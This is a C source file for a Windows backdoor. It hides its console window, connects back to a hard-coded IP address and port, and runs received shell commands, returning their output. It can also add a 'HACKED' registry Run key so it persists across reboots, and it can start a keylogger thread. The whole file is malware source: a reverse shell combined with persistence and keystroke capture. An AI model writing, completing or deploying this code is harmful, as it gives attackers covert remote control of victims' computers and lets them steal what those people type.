#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

#include "keylogger.h"


#define bzero(p, size) (void) memset((p), 0, (size));

int bootRun(){
    char err[128] = "Failed\n";
    char suc[128] = "Created Persistence with \n";

    TCHAR szPath[MAX_PATH];
    DWORD pathLen = 0;
    pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
    if (pathLen == 0){
        send(sock, err, sizeof(err), 0);
        return -1;
    }

    HKEY NewVal;
    if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS){
        send(sock, err, sizeof(err), 0);
        return -1;
    }
    DWORD pathLenInBytes = pathLen * sizeof(*szPath);
    if (RegSetValueEx(NewVal, TEXT("HACKED"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS){
        RegCloseKey(NewVal);
        send(sock, err, sizeof(err), 0);
        return -1;
    }
    RegCloseKey(NewVal);
    send(sock, suc, sizeof(suc), 0);
    return 0;


}

char *str_cut(char str[], int slice_from, int slice_to){



    if (str[0] == '\0'){
        return NULL
    }

    char * buffer;
    size_t str_len, buffer_len;
    if (slice_to < 0 && slice_from > slice_to){
        str_len = strlen(str);
        if (abs(slice_to) > str_len - 1){
            return NULL;
        }
        if (abs(slice_from) > str_len){
            slice_from = (-1) * str_len;
        }
        buffer_len = slice_to - slice_from;
        str += (str_len + slice_from);


    }
    else if (slice_from >= 0 && slice_to > slice_from){
        str_len = strlen(str);
        if (slice_from > str_len - 1){
            return NULL;
        }
        buffer_len = slice_to - slice_from;
        str += slice_from;
        
    }
    else{
        return NULL;
    }
    buffer = calloc(buffer_len, sizeof(char));
    strncpy(buffer, str, buffer_len);
    return buffer;
}

int sock;

//Function to jump to the next line


void Shell(){
    char buffer[1024];
    char container[1024];
    char total_response[18384];

    while (1){
        bzero(buffer, sizeof(buffer));
        bzero(container, sizeof(container));
        bzero(total_response, sizeof(total_response));
        recv(sock, buffer, 1024, 0);
        if (strncmp("q", buffer, 1) == 0) {
            // this means the client wants to quit
            closesocket(sock);
            WSACleanup();
            exit(0);
        }
        else if(strncmp("cd", buffer, 3) == 0){
            chdir(str_cut(buffer, 3, 100));
        }
        else if(strcmp("persist", buffer, 7) == 0){
            bootRun();
        }
        else if(strcmp("keylog_start", buffer, 12) == 0){
            HANDLE thread = CreateThread(NULL, 0, logg, NULL, 0, NULL);
            

        }
        else{
            FILE *fp;
            fp = _popen(buffer, "r");
            while(fgets(container, 1024, fp) != NULL){
                strcat(total_response, container);  
            }
            send(sock, total_response, sizeof(total_response), 0);
        }
    }


}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
    
    // the server side 
    struct sockaddr_in serverAddr;
    unsigned short serverPort = 12345; // Example port number
    char *serverIp;
    WSADATA wsaDATA;
    serverIp = "10.6.157.138";

    if (WSAStartup(MAKEWORD(2, 0), &wsaDATA) != 0){
        exit(1);
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        exit(1);
    }

    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(serverIp);
    serverAddr.sin_port = htons(serverPort);

    // the socket is what connects the client and the server 
    while (connect(sock, (struct sockaddr * ) &serverAddr, sizeof(serverAddr) ) != 0){
        Sleep(10);
    }
    // Additional code to connect the socket would go here
    Shell();


    return 0;
}

int main(){
    return 0;
}
